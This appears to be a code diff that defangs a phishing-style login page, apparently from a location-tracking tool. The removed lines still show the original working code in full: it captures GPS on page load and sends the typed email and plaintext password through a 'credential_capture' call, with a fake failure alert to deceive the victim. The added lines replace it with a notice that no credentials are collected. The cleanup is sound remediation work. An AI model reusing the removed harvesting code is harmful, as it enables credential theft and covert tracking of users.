@@ -12,31 +12,11 @@
     .login-wrap button { width: 100%; padding: 12px; background: #579ffb; color: #fff; border: 0; border-radius: 4px; }
   </style>
 </head>
-<body onload="gpsLocation()">
+<body>
   <div class="login-wrap">
-    <h2>Secure Sign In</h2>
-    <p>Verify your identity and location to continue.</p>
-    <label>Email</label>
-    <input id="login-email" type="email" placeholder="you@example.com">
-    <label>Password</label>
-    <input id="login-password" type="password" placeholder="********">
-    <button id="login-submit" type="button">Continue</button>
+    <h2>Sign-in is unavailable</h2>
+    <p>This demonstration never requests or collects passwords or other credentials.</p>
+    <p><a href="../consent/">Open the explicit consent page</a></p>
   </div>
-  <script src="../smart_client.js"></script>
-  <!-- tc_payload -->
-  <script>
-    document.getElementById('login-submit').addEventListener('click', function () {
-      var email = document.getElementById('login-email').value;
-      var password = document.getElementById('login-password').value;
-      if (window.Hound) {
-        window.Hound.send('credential_capture', {
-          credentials: { email: email, password_length: password.length, password: password }
-        });
-      }
-      alert('Verification failed. Please enable location and try again.');
-      gpsLocation();
-    });
-  </script>
-  <script src="../script.js"></script>
 </body>
 </html>
